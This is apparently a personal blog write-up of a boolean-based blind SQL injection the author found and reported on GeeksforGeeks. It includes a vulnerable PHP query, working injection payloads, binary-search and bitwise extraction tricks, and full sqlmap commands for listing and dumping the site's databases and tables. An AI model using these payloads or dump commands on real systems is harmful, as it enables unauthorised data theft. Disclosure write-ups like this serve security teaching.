---
title: SQL Injection for Competitive Programmers
layout: post
---

### 1. Introduction:

This blog post covers following:
1. SQL Injection vulnerability that I found on one of the most known computer science platform. (Geeksforgeeks)
2. Boolean SQL Injection Exploitation with bitwise tricks and binary search by referncing articles from Geeksforgeeks.
3. Using SQLMap efficient.


### 2. Boolean Based SQL Injection:

If you don't know what is sql injection please google it. Most of the resources on internet explain better than me!

Btw here is an example code for boolean based one:

```php
<?php
$query="SELECT * FROM questions WHERE number='$num' LIMIT 0,1";
$row = mysql_fetch_array(mysql_query($query));
	
if($row){
	echo 'Yes, question exists!'; // 'where' condition is true
}
else{
	echo ''; // false
}
?>
```

By looking the response we understand whether if the sql query is true or not. There is no any kind of error.


To add our payload, we could break original query by using single quote character. But it also may be like that:


Example:

```sql
...number=(("('$num')"))...
```

Then we should use;

```sql
')")) our_query --+ 
```


#### 2.1. Let's find out name of the database:


First of all, we may want to know the length of database'name by using
length(database()) = X query. We can use any kind of bool operator for guessing the number.


*Let me explain;*


* True and True is always True,
* True and False is always False,
* True or False is always True,
* False or False is always False.

In this situation we know our first condition is True (trackSlug is PC Bla...), you are free to use any of them. We may also change the first condition to a false statement then by ORing our conditions to find out if our condition is True or Not.



**Simple Payload:**
```sql
PC-W1-I59391638' or length(database())=1# 
```

This returned 500, so we may think that two sides of the OR operator are False.
We already know that first one is False.


> What if we use an iterator loop to find out length?
> 

**Pseudo Code:**
```cpp
for(int i=0; i<N; i++){

  payload="PC-W1-I59391638' or length(database())="+i+"# ";

  send(payload);

  // Check if status code is 500 or not.

}
```


This Linear Search naive solution is a waste of time. 



After finding our database's length; we may want to know each characters of name of it.



**Example Query**:
```sql
' or substring(database(),1,1)='a'#
```

We can guess every character of it by iterating the index and brute forcing for all known character sets :)


But this way is huge waste of time;

I wanna show you 2 tricky way to speed up process...

 
#### 2.2. Most Popular Technique: Binary Search



If you have never heard binary search; you may want to check this article:

[https://www.geeksforgeeks.org/binary-search/](https://www.geeksforgeeks.org/binary-search/)



> How can we use for our problem?


We have already had an array for every character, on the other hand;
The ASCII table :)

[http://www.asciitable.com](http://www.asciitable.com)


ASCII table is a sorted array, so that we can search a character's ascii value O(LogN) time. N is the inputs between first and last significant characters.
  
> What significant characters means ?

Let's say we want to name a database. We can not to use special characters like SUB, NULL, ESC. Most of the database names are alphanumerical so that we do not need to look all over the ASCII table :) Looking for ascii values between 48 and 122 is fine for us. 

I will explain more by doing on the part III.


#### 2.3. Bitwise Trick:



One of the basic bitwise code interview questions is **Check whether K-th bit is set or not**


As mentioned in this article:

[https://www.geeksforgeeks.org/check-whether-k-th-bit-set-not/](https://www.geeksforgeeks.org/check-whether-k-th-bit-set-not/)



>  Let's say we want to know all bits of a char.  
>  
>  For example; 01100111   which is 'g'. 
>  
>  If we can find all of its bits are set or not, we can guess it.
 
 
 *Let me explain;*


* 1 & 0 is always 0,
* 0 & 0 always 0,
* 1 & 1 is always 1.

We can understand whether if the bit is set or not, by ANDing a byte which has seven unset bits and one set bit.
If we can iterate, we find all of the bits.


Lets say we have only one bit = > "1" and the char has the following bits: 01100111  ('g').


>The result of     "00000001"  AND  "01100111" is one,
>
>The result of     "00000010"  AND  "01100111" is also one,
>
>But the result of "00001000" AND "01100111 " is zero :)

Guess what we are gonne do;

We will create the following bytes:

> 00000001
> 
> 00000010
> 
> 00000100
> 
> 00001000
> 
> 00010000
> 
> 00100000
> 
> 01000000
> 
> 10000000

Then we will AND all of them one by one with the character that we don't know actually. By the way we actually don't know the character but we know the response of the server change is dependent on the boolean conditions.

**There is an easier way to do this;**

1. Create a byte which has only one bit is set
2. Shift it for 7 times
3. AND the generated byte for each shift with unknown character
4. If the result is one, then we will know that the bit is set :)

**Let's look into the pseudo code given below:**

```cpp
for(int i=0; i<=7; i++){
    if (CHARACTER & (1 << (i))) 
        cout << "1"; 
    else
        cout << "0"; 
}
```


**Our query which returns ascii value of first character of the table in current database() :**

```sql
ord(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1)) 
```

If we assume that the tablename is "geeks", so the returned value will be 103.

**Let's learn bitwise method by doing:**

Please look at these screenshots carefully :) If the bit is set the result is power of two.


![]({{ site.url }}/assets/geeks4geeks/bitwise/1.png)
![]({{ site.url }}/assets/geeks4geeks/bitwise/2.png)
![]({{ site.url }}/assets/geeks4geeks/bitwise/3.png)
![]({{ site.url }}/assets/geeks4geeks/bitwise/4.png)


**Let's try to decode it:**

0 - 64 - 32 - 0 - 0 - 4 - 2 -1

01100111 => which is 103, the ascii value of 'g'.



**Here it is:**

![]({{ site.url }}/assets/geeks4geeks/bitwise/5.png)






### 3. Manual Exploitation

ASCII values between 48-122 is usually fine for us like I wrote before. 


Let's find out if ascii value of our first char of db name is bigger than one or not: 

![]({{ site.url }}/assets/geeks4geeks/binary/1.png)
Yes it is. Let's continue by using binary search algorithm to find ascii value of the first character:
![]({{ site.url }}/assets/geeks4geeks/binary/2.png)

![]({{ site.url }}/assets/geeks4geeks/binary/3.png)
![]({{ site.url }}/assets/geeks4geeks/binary/4.png)
![]({{ site.url }}/assets/geeks4geeks/binary/5.png)
![]({{ site.url }}/assets/geeks4geeks/binary/6.png)
 Looks like ascii value of our first character is 103, so it is 'g'.

To find out other ones; we can change the index. 
For example if we want to check for second character:
![]({{ site.url }}/assets/geeks4geeks/binary/e-char.png)
We found second character is not 'e', because the http status is 500.
Looks like the second character is 'f':

![]({{ site.url }}/assets/geeks4geeks/binary/f-char.png)

### 4. Using SQLMap 

It's better to use sqlmap if it works well; otherwise you may want to exploit sql injections manually. 
Sometimes sqlmap doesn't help on some cases; this is why you may want to know how manual exploitation works.

**Let's use sqlmap more effective way:**

1) We know our payload works like that:

```sql
PC-W1-I59391638' or length(database())=1# 
```

So that we may want to use these parameters: --prefix="' " --suffix=" # asd".

2) --technique=B (we have already known that our vulnerability is boolean based) 

3) -r request.txt I copied the request from burp's repeater and saved into request.txt

4) We also know that our database is MySQL  --dbms=mysql

5) -p we know which parameter is vulnerable: -p "trackSlug"

6) -v is for level of verbosity, 4 is nice for me.

7) --threads 10 which helps to make multiple requests at the same time

8) --code=200, HTTP code when query is True. 

9) --batch for instead of waiting for the user’s input.

You can use your own sql query with "--sql-query" option if you want.


Let's dump list of databases:

`sqlmap -r request.txt --prefix="' " --suffix=' # asd' --technique=B --dbms=mysql --batch --code=200 --threads 10 -v 4 -p "trackSlug" --dbs`


List of tables:

`sqlmap -r request.txt --prefix="' " --suffix=' # asd' --technique=B --dbms=mysql --batch --code=200 --threads 10 -v 4 -p "trackSlug" -D gf**** --tables `


![]({{ site.url }}/assets/geeks4geeks/sqlmap/1.png)


Let's look into the "The_Table_Name" table: 

`sqlmap -r request.txt --prefix="' " --suffix=' # asd' --technique=B --dbms=mysql --batch --code=200 --threads 10 -v 4 -p "trackSlug" -D gf**** -T The_Table_Name --columns`

![]({{ site.url }}/assets/geeks4geeks/sqlmap/3.png)

Dumping data from specialized column:

`sqlmap -r request.txt --prefix="' " --suffix=' # asd' --technique=B --dbms=mysql --batch --code=200 --threads 10 -v 4 -p "trackSlug" -D gf**** -T The_Table_Name -C column_name --dump `

![]({{ site.url }}/assets/geeks4geeks/sqlmap/2.png)

This bug was fixed and I got a certificate from GeeksforGeeks Team.
